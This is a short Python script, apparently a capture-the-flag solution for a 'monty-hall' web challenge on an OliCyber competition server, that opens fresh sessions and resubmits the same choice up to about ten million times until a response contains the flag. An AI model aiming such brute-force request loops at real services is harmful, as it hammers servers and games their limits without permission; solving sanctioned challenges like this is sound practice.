import requests
url='http://monty-hall.challs.territoriale.olicyber.it/'
data={'choice': '1'}
ciao = 0
i=0
while ciao == 0:
    i=i+1
    s = requests.session()
    r = s.post(url,data)
    g = s.get(url)
    if "flag" in str(g.content):
        print(g.content)
        break
    if "flag" in str(r.content):
        print(r.content)
        break
    if i == 9999999:
        break